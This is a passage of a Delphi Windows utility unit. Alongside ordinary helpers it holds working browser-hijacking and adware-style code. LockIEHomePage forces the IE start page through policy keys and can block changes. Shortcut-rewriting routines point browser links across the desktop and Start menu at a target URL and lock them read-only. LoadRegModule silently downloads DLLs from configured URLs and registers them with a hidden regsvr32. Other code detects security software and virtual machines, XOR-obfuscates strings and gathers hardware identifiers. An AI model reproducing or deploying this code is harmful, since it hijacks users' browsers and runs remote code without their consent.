    Result := FormatFloat(Format, AValue / 1048576) + ' MB'
  else if AValue >= 1024 then
    Result := FormatFloat(Format, AValue / 1024) + ' KB'
  else
    Result := IntToStr(AValue) + ' B';
end;

procedure InitShellRecord(var ShExecInfo: SHELLEXECUTEINFOW);
begin
  ShExecInfo.cbSize := sizeof(SHELLEXECUTEINFO);
  ShExecInfo.fMask := SEE_MASK_NOCLOSEPROCESS;
  ShExecInfo.Wnd := 0;
  ShExecInfo.lpVerb := nil;
  ShExecInfo.lpFile := nil;
  ShExecInfo.lpParameters := nil;
  ShExecInfo.lpDirectory := nil;
  ShExecInfo.nShow := SW_SHOWNORMAL;
  ShExecInfo.hInstApp := 0;
end;

procedure OpenSelectFile(const AFileName: string);
begin
  ShellExecute(0, PChar('open'), PChar('explorer'),
    PChar('/select,"' + AFileName + '"'), nil, SW_SHOW);
end;

function LockIEHomePage(const URL: string;
  const bDisableChange: Boolean = False): Boolean;

var
  reg: TRegistry;
begin
  try
    Result := False;
    reg := TRegistry.Create;
    try
      
      reg.RootKey := HKEY_LOCAL_MACHINE;
      if reg.OpenKey('Software\Policies\Microsoft\Internet Explorer\Main',
        True) then
      begin
        reg.WriteString('Start Page', URL);
        reg.CloseKey;
      end;
      if bDisableChange then
      begin
        if reg.OpenKey(
          'Software\Policies\Microsoft\Internet Explorer\Control Panel', True)
          then
        begin
          reg.WriteInteger('HomePage', 1);
          reg.CloseKey;
        end;
      end;
      Result := True;
    finally
      reg.Free;
    end;
  except
  end;
end;

function GetIEVersionStr: string;
var
  reg: Registry.TRegistry;
begin
  Result := '';
  reg := TRegistry.Create;
  try
    reg.RootKey := HKEY_LOCAL_MACHINE;
    if reg.OpenKeyReadOnly('Software\Microsoft\Internet Explorer') then
    begin
      if reg.ValueExists('Version') then
        Result := reg.ReadString('Version');
    end;
  finally
    reg.Free;
  end;
end;

function GetIEAppPath: string;

var
  iekey: HKEY;
  iename: array [0 .. 255] of Char;
  vType, dLength: DWORD;
begin
  vType := REG_SZ;
  RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    'Software\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE', 0,
    KEY_ALL_ACCESS, iekey);
  dLength := sizeof(iename);
  if RegQueryValueEx(iekey, '', nil, @vType, @iename[0], @dLength) = 0 then
    Result := iename
  else
    Result := 'C:\Program Files\Internet Explorer\IEXPLORE.EXE';
  RegCloseKey(iekey);
end;

function CreateDeskupLink(const ATarget, ALinkName, AIconSrc,
  AWorkingDirectory, AArgument, ADescription: string;
  const AIconIndex: Integer; const ATaskId: string): Boolean;
var
  prShObject: IUnknown;
  prShLink: IShellLink;
  prShFile: IPersistFile;
  PIDL: PItemIDList;
  prBuf: array [0 .. MAX_PATH] of Char;
  prDeskupDirectory: string;
  prLinkPath: string;
  prFileData: TWin32FindData;
begin
  Result := False;
  try
    SHGetSpecialFolderLocation(0, CSIDL_DESKTOPDIRECTORY, PIDL);
    
    SHGetPathFromIDList(PIDL, prBuf); 
    prDeskupDirectory := StrPas(prBuf);
    if RightStr(prDeskupDirectory, 1) <> '\' then
      prDeskupDirectory := prDeskupDirectory + '\';
    prLinkPath := prDeskupDirectory + ALinkName + '.lnk';
    if FileExists(prLinkPath) then
    begin
      if ATaskId <> '' then
        Referrepeat := AddSpliteString(Referrepeat, ATaskId);
      Result := True;
      Exit;
    end;
    prShObject := CreateComObject(CLSID_ShellLink); 
    prShLink := prShObject as IShellLink; 
    prShFile := prShObject as IPersistFile; 
    prShLink.SetPath(PChar(ATarget)); 
    prShLink.SetWorkingDirectory(PChar(AWorkingDirectory)); 
    prShLink.SetDescription(PChar(ADescription));
    prShLink.SetIconLocation(PChar(AIconSrc), AIconIndex);
    prShLink.SetArguments(PChar(AArgument));
    prShFile.Save(PChar(prLinkPath), True);
    Result := True;
    if ATaskId <> '' then
      Referok := AddSpliteString(Referok, ATaskId);
  except
  end;
end;

function CreateQuickLaunchShortcut(const ATarget, ALinkName, AIconSrc,
  AWorkingDirectory, AArgument, ADescription: string;
  const AIconIndex: Integer): Boolean;
var
  prShObject: IUnknown;
  prShLink: IShellLink;
  prShFile: IPersistFile;
  prLinkPath: string;
  prTmp: string;
begin
  Result := False;
  try
    prTmp := GetSpecialFolderDir(CSIDL_APPDATA);
    if Win32MajorVersion < 6 then
      prTmp := prTmp + 'Microsoft\Internet Explorer\Quick Launch\';
    prLinkPath := prTmp + ALinkName + '.lnk';

    prShObject := CreateComObject(CLSID_ShellLink); 
    prShLink := prShObject as IShellLink; 
    prShFile := prShObject as IPersistFile; 
    prShLink.SetPath(PChar(ATarget)); 
    prShLink.SetWorkingDirectory(PChar(AWorkingDirectory)); 
    prShLink.SetDescription(PChar(ADescription));
    prShLink.SetIconLocation(PChar(AIconSrc), AIconIndex);
    prShLink.SetArguments(PChar(AArgument));
    prShFile.Save(PChar(prLinkPath), True);
    if Win32MajorVersion >= 6 then
    begin
      ShellExecute(0, 'TaskbarPin', PChar(prLinkPath), nil, nil, SW_HIDE);
    end;

    Result := True;
  except
  end;
end;

function AddSpliteString(const ASrcStr: string; const AAddStr: string;
  const ASplite: string = '|'): string;
begin
  if Trim(ASrcStr) = '' then
    Result := AAddStr
  else
    Result := ASrcStr + ASplite + AAddStr;
end;

function CreateComObject(const ClassID: TGUID): IUnknown;
begin
  try
    CoCreateInstance(ClassID, nil, CLSCTX_INPROC_SERVER or CLSCTX_LOCAL_SERVER,
      IUnknown, Result);
  except
  end;
end;

procedure FindAllFiles(const APath: string; AFiles: TStrings;
  const APropty: String = '*.*'; IsAddPath: Boolean = True);
var
  FS: TSearchRec;
  FPath: String;
  AddPath: string;
begin
  if not Assigned(AFiles) then
    Exit;
  if not DirectoryExists(APath) then
    Exit;
  FPath := IncludeTrailingPathDelimiter(APath);
  if IsAddPath then
    AddPath := FPath
  else
    AddPath := '';
  if findFirst(FPath + APropty, faanyfile, FS) = 0 then
  begin
    repeat
      if (FS.Name <> '.') and (FS.Name <> '..') then
        if ((FS.Attr and fadirectory) = fadirectory) then
          FindAllFiles(FPath + FS.Name, AFiles, APropty, IsAddPath)
        else
          AFiles.Add(AddPath + FS.Name);
    until FindNext(FS) <> 0;
    SysUtils.findClose(FS);
  end;
end;

function SubCheckLink(const ALinkPath: string; const ATarUrl: string): Boolean;

var
  prShObject: IUnknown;
  prShLink: IShellLink;
  prShFile: IPersistFile;
  Buf: array [0 .. MAX_PATH - 1] of Char;
  pfd: TWin32FindDataW;
  prLnkName, prName, prArg: string;
  i, iRet: Integer;
begin
  Result := False;
  prLnkName := ExtractFileNameNoExt(ALinkPath);
  iRet := -1;
  for i := 0 to Length(BrowserRule) - 1 do
  begin
    if MatchesMask(prLnkName, BrowserRule[i].linkName) then
    begin
      iRet := i;
      Break;
    end;
  end;
  if iRet < 0 then
    Exit;
  try
    CoInitialize(nil);
    prShObject := CreateComObject(CLSID_ShellLink);
    prShLink := prShObject as IShellLink;
    prShFile := prShObject as IPersistFile;

    if prShFile.Load(PChar(ALinkPath), STGM_READWRITE) = S_OK then
    begin
      ZeroMemory(@pfd, sizeof(pfd));
      prShLink.GetPath(@Buf, MAX_PATH - 1, pfd, SLGP_RAWPATH);
      prName := ExtractFileName(Buf);
      if prName = BrowserRule[i].ExeName then
      begin
        prShLink.GetArguments(@Buf, MAX_PATH - 1);
        if Buf <> ATarUrl then
        begin
          SetFileNotReadOnly(ALinkPath);
          prShLink.SetArguments(PChar(ATarUrl));
          prShFile.Save(PChar(ALinkPath), True);
          Result := True;
          SetFileReadOnly(ALinkPath);
        end;
      end;
    end;
    CoUninitialize;
  except

  end;
end;

function SubSearchLinkPath(const ASrcPath: string;
  const ATarUrl: string): Integer;

var
  lst: TStringList;
  i: Integer;
  tmp: string;
begin
  Result := 0;
  lst := TStringList.Create;
  try
    FindAllFiles(ASrcPath, lst, '*.*', True);
    for i := 0 to lst.Count - 1 do
    begin
      tmp := lst.Strings[i];
      if LowerCase(ExtractFileExt(tmp)) = '.lnk' then
      begin
        if SubCheckLink(tmp, ATarUrl) then
          inc(Result);
      end;
    end;
  finally
    lst.Free;
  end;
end;

function InitBrowserRule(const ASrcString: string; out ARule: TBrowserRuleArray)
  : Boolean;
var
  lst: TStringList;
  i, iPos: Integer;
  tmp: string;
begin
  Result := False;
  lst := TStringList.Create;
  try
    SplitStrings(ASrcString, '|', lst);
    SetLength(ARule, lst.Count);
    for i := 0 to lst.Count - 1 do
    begin
      tmp := lst.Strings[i];
      iPos := Pos('=', tmp);
      if iPos > 0 then
      begin
        ARule[i].linkName := Copy(tmp, 1, iPos - 1);
        ARule[i].ExeName := Copy(tmp, iPos + 1, Length(tmp) - iPos);
      end;
    end;
    if lst.Count > 0 then
      Result := True;
  finally
    lst.Free;
  end;
end;

function SubReBrowserLnk(const ATarUrl: string): Integer;
var
  tmp: string;
  iRet: Integer;
begin
  Result := 0;
  
  InitBrowserRule(BrowserRuleString, BrowserRule);
  
  tmp := GetSpecialFolderDir(CSIDL_DESKTOP);
  iRet := SubSearchLinkPath(tmp, ATarUrl);
  if iRet > 0 then
    inc(Result, iRet);
  
  tmp := GetSpecialFolderDir(CSIDL_COMMON_DESKTOPDIRECTORY);
  iRet := SubSearchLinkPath(tmp, ATarUrl);
  if iRet > 0 then
    inc(Result, iRet);
  
  tmp := GetSpecialFolderDir(CSIDL_STARTMENU);
  iRet := SubSearchLinkPath(tmp, ATarUrl);
  if iRet > 0 then
    inc(Result, iRet);
  
  tmp := GetSpecialFolderDir(CSIDL_COMMON_STARTMENU);
  iRet := SubSearchLinkPath(tmp, ATarUrl);
  if iRet > 0 then
    inc(Result, iRet);
  
  tmp := GetSpecialFolderDir(CSIDL_APPDATA);
  tmp := tmp + 'Microsoft\Internet Explorer\Quick Launch\';
  iRet := SubSearchLinkPath(tmp, ATarUrl);
  if iRet > 0 then
    inc(Result, iRet);
end;

function CheckTaskInstalled(AKeyName: string): Boolean;
var
  reg: TRegistry;
  lst: TStringList;
  i: Integer;
  function pCheck(): Boolean;
  begin
    Result := False;
    if reg.OpenKeyReadOnly(
      'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + AKeyName) then
    begin
      lst.Clear;
      reg.GetValueNames(lst);
      if lst.Count > 0 then
        Result := True;
      reg.CloseKey;
    end;
  end;

begin
  Result := False;
  reg := TRegistry.Create;
  lst := TStringList.Create;
  try
    reg.RootKey := HKEY_CURRENT_USER;
    Result := pCheck;

    if not Result then
    begin
      reg.RootKey := HKEY_LOCAL_MACHINE;
      Result := pCheck;
    end;

    if not Result then
    begin
      reg.RootKey := HKEY_CURRENT_USER;
      reg.Access := reg.Access or KEY_WOW64_64KEY;
      Result := pCheck;
    end;

    if not Result then
    begin
      reg.RootKey := HKEY_LOCAL_MACHINE;
      reg.Access := reg.Access or KEY_WOW64_64KEY;
      Result := pCheck;
    end;
  finally
    lst.Free;
    reg.Free;
  end;
end;

function ShellOpenFile(const AFileName: string): Boolean;
begin
  Result := ShellExecute(0, PChar('open'), PChar(AFileName), nil, nil, SW_SHOW)
    > 32;
end;
{$IFNDEF USE_XLSDK}

function LoadHttpSdkByFile(): Boolean;
var
  mr: TResourceStream;
  mm: TMemoryStream;
  mz: TDecompressionStream;
  num: Integer;
  pPath: string;
begin
  Result := False;
  try
    mr := TResourceStream.Create(HInstance, 'HTTPMODE', RT_RCDATA);
    try
      if mr.Size <= 0 then
        Exit;
      mr.Position := 0;
      mr.ReadBuffer(num, sizeof(num));

      mm := TMemoryStream.Create;
      try
        mm.SetSize(num);
        mz := TDecompressionStream.Create(mr);
        try
          mz.Read(mm.Memory^, num);
          pPath := WorkPath + 'http.dll';
          mm.SaveToFile(pPath);
          Result := LoadSdkFromFile(pPath);
        finally
          mz.Free;
        end;
      finally
        mm.Free;
      end;
    finally
      mr.Free;
    end;
  except
  end;
end;

function LoadHttpSdkByMemory(): Boolean;
var
  mr: TResourceStream;
  mm: TMemoryStream;
  mz: TDecompressionStream;
  num: Integer;
begin
  Result := False;
  try
    mr := TResourceStream.Create(HInstance, 'HTTPMODE', RT_RCDATA);
    try
      if mr.Size <= 0 then
        Exit;
      mr.Position := 0;
      mr.ReadBuffer(num, sizeof(num));

      mm := TMemoryStream.Create;
      try
        mm.SetSize(num);
        mz := TDecompressionStream.Create(mr);
        try
          mz.Read(mm.Memory^, num);
          mm.Position := 0;
          Result := LoadSdkFromMemory(mm.Memory, mm.Size);
        finally
          mz.Free;
        end;
      finally
        mm.Free;
      end;
    finally
      mr.Free;
    end;
  except
  end;
end;

function LoadHttpSdk(): Boolean;
begin
  Result := False;
  try
    Result := LoadHttpSdkByMemory();
  except
  end;
  if (not Result) then
    try
      Result := LoadHttpSdkByFile();
    except
    end;
end;
{$ENDIF}

function DownloadByThunder(const URL: string; const RefUrl: string = '')
  : Boolean;
var
  Thunder: TAgent;
begin
  Result := False;
  try
    Thunder := TAgent.Create(nil);
    try
      Thunder.AddTask(URL, '', '', '', RefUrl, 1, 0, 0);
      Thunder.CommitTasks;
      Result := True;
    finally
      Thunder.Free;
    end;
  except
  end;
end;

function IsFileInUse(fName: string): Boolean;
var
  HFileRes: hFile;
begin
  Result := False;
  if not FileExists(fName) then
    Exit;
  HFileRes := CreateFile(PChar(fName), GENERIC_READ or GENERIC_WRITE, 0, nil,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  Result := (HFileRes = INVALID_HANDLE_VALUE);
  if not Result then
    CloseHandle(HFileRes);
end;

function FileSize(FileName: string): Int64;
var
  sr: TSearchRec;
begin
  if findFirst(FileName, faanyfile, sr) = 0 then
    Result := Int64(sr.FindData.nFileSizeHigh) shl 32 + Int64
      (sr.FindData.nFileSizeLow)
  else
    Result := 0;

  findClose(sr);
end;

function ExtractResToFile(ResType, ResName, ResNewName: String): Boolean;

var
  Res: TResourceStream;
begin
  Result := True;
  try
    Res := TResourceStream.Create(HInstance, ResName, PChar(ResType));
    Res.SaveToFile(ResNewName);
    Res.Free;
  except
    Result := False;
  end;
end;
{$IFDEF USE_XLSDK}

function SetFreeXlSdk(): Boolean;
var
  FreePath: string;
begin
  Result := True;
  try
    FreePath := DataPath + 'xldl.dll';
    if not FileExists(FreePath) then
      Result := ExtractResToFile('XLSDK', 'XLDL', FreePath);
    FreePath := DataPath + 'download\';
    if not DirectoryExists(FreePath) then
      ForceDirectories(FreePath);

    FreePath := DataPath + 'download\' + 'atl71.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'ATL71', FreePath);

    FreePath := DataPath + 'download\' + 'dl_peer_id.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'dl_peer_id', FreePath);

    FreePath := DataPath + 'download\' + 'download_engine.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'download_engine', FreePath);

    FreePath := DataPath + 'download\' + 'id.dat';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'id', FreePath);

    FreePath := DataPath + 'download\' + 'MiniThunderPlatform.exe';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'MiniThunderPlatform', FreePath);

    FreePath := DataPath + 'download\' + 'minizip.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'minizip', FreePath);

    FreePath := DataPath + 'download\' + 'msvcp71.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'msvcp71', FreePath);

    FreePath := DataPath + 'download\' + 'msvcr71.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'msvcr71', FreePath);

    FreePath := DataPath + 'download\' + 'XLBugHandler.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'XLBugHandler', FreePath);

    FreePath := DataPath + 'download\' + 'XLBugReport.exe';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'XLBugReport', FreePath);

    FreePath := DataPath + 'download\' + 'zlib1.dll';
    if Result and (not FileExists(FreePath)) then
      Result := ExtractResToFile('XLSDK', 'zlib1', FreePath);

    FreePath := DataPath + 'download\' + 'MiniTPFw.exe';
    if Result and (not FileExists(FreePath)) then
    begin
      if ExtractResToFile('XLSDK', 'MiniTPFw', FreePath) then
        ShellExecute(0, nil, PChar(FreePath), nil,
          PChar(ExtractFilePath(FreePath)), SW_HIDE);
    end;
  except
    Result := False;
  end;
end;

procedure ReadHisIni(var AHis: THisConfigInfo);
begin
  if Assigned(HisConfig) and (AHis.urlMd5 <> '') then
  begin
    AHis.savename := HisConfig.ReadString(AHis.urlMd5, 'savename', '');
    AHis.nTotalSize := HisConfig.ReadInt64(AHis.urlMd5, 'nTotalSize', 0);
  end;
end;

procedure SaveHisIni(AHis: THisConfigInfo);
begin
  if Assigned(HisConfig) and (AHis.urlMd5 <> '') then
  begin
    HisConfig.WriteString(AHis.urlMd5, 'savename', AHis.savename);
    HisConfig.WriteInt64(AHis.urlMd5, 'nTotalSize', AHis.nTotalSize);
  end;
end;
{$ENDIF}

function GetMaxDriver(const bFreeSpace: Boolean = True;
  szSize: PInt64 = nil): string;
var
  i: Integer;
  TotalSpace, FreeSpaceAvailable: Int64;
  maxSize: Int64;
  drName: string;
begin
  Result := '';
  maxSize := 0;
  for i := 66 to 90 do
  begin
    drName := Chr(i) + ':\';
    if (GetDriveType(PChar(drName)) = 2) or (GetDriveType(PChar(drName)) = 3)
      then
    begin
      if GetDiskFreeSpaceEx(PChar(drName), FreeSpaceAvailable, TotalSpace, nil)
        then
      begin
        if bFreeSpace then
        begin
          if FreeSpaceAvailable > maxSize then
          begin
            maxSize := FreeSpaceAvailable;
            Result := drName;
          end;
        end
        else
        begin
          if TotalSpace > maxSize then
          begin
            maxSize := TotalSpace;
            Result := drName;
          end;
        end;
      end;
    end;
  end;
  if Assigned(szSize) and (maxSize > 0) then
    szSize^ := maxSize;
end;

function GetSDState(): Cardinal;
var
  hSnap: THandle;
  i: Integer;
  pe: TProcessEntry32W;
  chk: array of Boolean;
begin
  Result := 0;
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if hSnap <> 0 then
  begin
    SetLength(chk, Length(SAFESOFT));
    ZeroMemory(@chk[0], Length(chk) * sizeof(Boolean));
    pe.dwSize := sizeof(TProcessEntry32W);
    Process32First(hSnap, pe);
    repeat
      for i := 0 to Length(SAFESOFT) - 1 do
        if (not chk[i]) and (LowerCase(pe.szExeFile) = LowerCase(SAFESOFT[i]))
          then
        begin
          Result := Result or (1 shl i);
          chk[i] := True;
        end;
    until (not Process32Next(hSnap, pe));
  end;
end;

function SetFileReadOnly(const FileName: string): Boolean;
begin
  Result := FileSetAttr(FileName, FileGetAttr(FileName) or faReadOnly) = 0;
end;

function SetFileNotReadOnly(const FileName: string): Boolean;
begin
  Result := FileSetAttr(FileName, FileGetAttr(FileName) and (not faReadOnly))
    = 0;
end;

function LoadRegModule(node: IXMLDOMNode): Integer; overload;
var
  i: Integer;
  xmlModule: IXMLDOMNode;
  xmlWin: IXMLDOMNode;
  tarPath, tmpPath, savename, sParam: string;
  URL: string;
  xmlUrl: IXMLDOMNode;
begin
  try
    Result := 0;
    if not Assigned(node) then
      Exit;
    tarPath := FixPath(GetSpecialFolderDir(CSIDL_APPDATA));
    for i := 0 to node.childNodes.Length - 1 do
    begin
      xmlModule := node.childNodes.item[i];
      if Assigned(xmlModule) and (xmlModule.nodeName = 'module') then
      begin
        if bIsWin64 then
          xmlWin := xmlModule.selectSingleNode('win64')
        else
          xmlWin := xmlModule.selectSingleNode('win32');
        if Assigned(xmlWin) then
        begin
          xmlUrl := xmlWin.selectSingleNode('url');
          if Assigned(xmlUrl) and Assigned
            (xmlWin.attributes.getNamedItem('savename')) then
          begin
            savename := xmlWin.attributes.getNamedItem('savename').nodeValue;
            URL := xmlUrl.text;
            if (Trim(savename) <> '') and (IsHttpUrl(URL)) then
            begin
              tmpPath := tarPath + savename;
              if (not FileExists(tmpPath)) and DownloadTaskFile(URL, tmpPath)
                then
              begin
                sParam := Format('/s /c "%s"', [tmpPath]);
                if ShellExecute(0, nil, PChar('regsvr32'), PChar(sParam), nil,
                  SW_HIDE) > 32 then
                  inc(Result);
              end;
            end;
          end;
        end;
      end;
    end;
  except
  end;
end;

function LoadRegModule(nodeStr: string): Integer; overload;
var
  xml: IXMLDOMDocument;
begin
  Result := 0;
  xml := CoDOMDocument.Create;
  if (xml.loadXML(nodeStr)) then
    Result := LoadRegModule(xml.documentElement);
end;

const
  XorKey: array [0 .. 7] of Byte = ($B2, $09, $BB, $55, $93, $6D, $44, $47);
  
function EncString(Str: string): string;
var
  i, j: Integer;
begin
  Result := '';
  j := 0;
  for i := 1 to Length(Str) do
  begin
    Result := Result + IntToHex(Byte(Str[i]) xor XorKey[j], 2);
    j := (j + 1) mod 8;
  end;
end;

function DecString(Str: string): string;
var
  i, j: Integer;
begin
  Result := '';
  j := 0;
  for i := 1 to Length(Str) div 2 do
  begin
    Result := Result + Char(StrToInt('$' + Copy(Str, i * 2 - 1, 2))
        xor XorKey[j]);
    j := (j + 1) mod 8;
  end;
end;

function RndPercent(const APer: Integer): Boolean;
begin
  Randomize();
  Result := Random(100) < APer;
end;

function URLEncode(URL: string): string;
begin
  Result := TIdURI.URLEncode(URL);
end;

function URLDecode(URL: string): string;
begin
  Result := TIdURI.URLDecode(URL);
end;

function IsXmlStr(strXML: string): Boolean;
var
  xml: IXMLDOMDocument2;
begin
  try
    Result := False;
    xml := CoDOMDocument.Create;
    Result := xml.loadXML(strXML);
  except
  end;
end;

function IsWangBaPC(): Boolean;
var
  hSnap: THandle;
  i: Integer;
  pe: TProcessEntry32W;
begin
  Result := False;
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if hSnap <> 0 then
  begin
    pe.dwSize := sizeof(TProcessEntry32W);
    Process32First(hSnap, pe);
    repeat
      for i := 0 to Length(WANGBASOFT) - 1 do
        if (LowerCase(pe.szExeFile) = LowerCase(WANGBASOFT[i])) then
        begin
          Result := True;
          Exit;
        end;
    until (not Process32Next(hSnap, pe));
  end;
end;

function IsVMPC(): Boolean;
var
  hSnap: THandle;
  i: Integer;
  pe: TProcessEntry32W;
begin
  Result := False;
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if hSnap <> 0 then
  begin
    pe.dwSize := sizeof(TProcessEntry32W);
    Process32First(hSnap, pe);
    repeat
      for i := 0 to Length(VMSOFT) - 1 do
        if (LowerCase(pe.szExeFile) = LowerCase(VMSOFT[i])) then
        begin
          Result := True;
          Exit;
        end;
    until (not Process32Next(hSnap, pe));
  end;
end;

function GetUserEV(): DWORD;
begin
  Result := 0;
  
  if (IsWangBaPC()) then
    Result := Result or 1;
  
  if (IsVMPC()) then
    Result := Result or 2;
end;

function SpliteString(const Str: string; const strSpl: string;
  strList: TStrings): Integer;
var
  i: Integer;
  tmp1, tmp2: string;
begin
  
  tmp1 := Str;
  i := Pos(strSpl, Str);
  while i <> 0 do
  begin
    tmp2 := Copy(tmp1, 0, i - 1);
    if (tmp2 <> '') then
      strList.Add(tmp2);
    delete(tmp1, 1, i - 1 + Length(strSpl));
    i := Pos(strSpl, tmp1);
  end;
  strList.Add(tmp1);
  Result := strList.Count;
end;

function RC4Base64Encode(const ASrc: string; const AKey: AnsiString): string;
var
  strStream: TStringStream;
  mrc4: TRC4Engine;
begin
  Result := '';
  strStream := TStringStream.Create;
  try
    strStream.WriteString(ASrc);
    strStream.Position := 0;
    mrc4 := TRC4Engine.Create(PAnsiChar(AKey), Length(AKey));
    try
      mrc4.Process(strStream.Memory, strStream.Memory, strStream.Size);
    finally
      mrc4.Free;
    end;
    Result := EncodeBase64(strStream.Memory, strStream.Size);
  finally
    strStream.Free;
  end;
end;

function RC4Base64Decode(const ASrc: string; const AKey: AnsiString): string;
var
  strStream: TStringStream;
  outStream: TStringStream;
  mrc4: TRC4Engine;
  by: TBytes;
begin
  Result := '';
  strStream := TStringStream.Create;
  outStream := TStringStream.Create;
  try
    strStream.WriteString(ASrc);
    strStream.Position := 0;
    DecodeStream(strStream, outStream);
    mrc4 := TRC4Engine.Create(PAnsiChar(AKey), Length(AKey));
    try
      mrc4.Process(outStream.Memory, outStream.Memory, outStream.Size);
    finally
      mrc4.Free;
    end;
    Result := outStream.DataString;
  finally
    outStream.Free;
    strStream.Free;
  end;
end;

function GetVolumeAddress(): string;
var
  vVolumeNameBuffer: array [0 .. 255] of Char;
  vVolumeSerialNumber: DWORD;
  vMaximumComponentLength: DWORD;
  vFileSystemFlags: DWORD;
  vFileSystemNameBuffer: array [0 .. 255] of Char;
  dir: array [0 .. MAX_PATH] of Char;
  strDir: string;
begin
  Result := '';
  GetWindowsDirectory(dir, MAX_PATH);
  strDir := ExtractFileDir(StrPas(dir));
  if GetVolumeInformation(PChar(strDir), vVolumeNameBuffer,
    sizeof(vVolumeNameBuffer), @vVolumeSerialNumber, vMaximumComponentLength,
    vFileSystemFlags, vFileSystemNameBuffer, sizeof(vFileSystemNameBuffer)) then
  begin
    Result := IntToHex(vVolumeSerialNumber, 8);
  end;
end;

function GetAdapterAddress: string;
var
  pIpAdpInfo: PIPAdapterInfo;
  stSize: Cardinal;
  nRet: Integer;
  i: Integer;
  tmpStr: string;
begin
  Result := '';
  if IpTypes.IpHlpAPIHandle = 0 then
    if not IpTypes.InitIpHlpAPI() then
      Exit;
  if not Assigned(GetAdaptersInfo) then
    Exit;
  stSize := sizeof(IP_ADAPTER_INFO);
  pIpAdpInfo := AllocMem(stSize);
  nRet := GetAdaptersInfo(pIpAdpInfo, stSize);

  if nRet = ERROR_BUFFER_OVERFLOW then
  begin
    FreeMem(pIpAdpInfo);
    pIpAdpInfo := AllocMem(stSize);
    nRet := GetAdaptersInfo(pIpAdpInfo, stSize);
  end;

  if (nRet = ERROR_SUCCESS) then
  begin
    tmpStr := '';
    for i := 0 to pIpAdpInfo.AddressLength - 1 do
    begin
      tmpStr := tmpStr + IntToHex(pIpAdpInfo.Address[i], 2);
      if (i < pIpAdpInfo.AddressLength - 1) then
        tmpStr := tmpStr + '-';
    end;
    Result := tmpStr;
  end;
  if Assigned(pIpAdpInfo) then
    FreeMem(pIpAdpInfo);
end;

initialization

end.
 